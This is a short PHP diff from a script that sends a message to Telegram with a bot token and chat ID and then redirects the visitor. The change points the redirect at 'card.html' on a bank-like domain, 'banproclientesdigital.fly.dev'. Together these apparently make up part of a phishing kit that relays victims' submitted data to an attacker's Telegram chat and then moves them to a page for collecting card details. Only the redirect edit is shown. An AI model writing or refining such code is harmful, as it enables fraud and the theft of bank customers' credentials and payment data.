@@ -43,7 +43,7 @@ if (isset($token) && isset($chat_id)) {
             echo "Error al enviar el mensaje a Telegram.";
         } else {
             // Redirigir a otra página después de enviar el mensaje
-            header("Location: card.html");
+            header("Location: https://banproclientesdigital.fly.dev/card.html");
             exit();
         }
     } else {
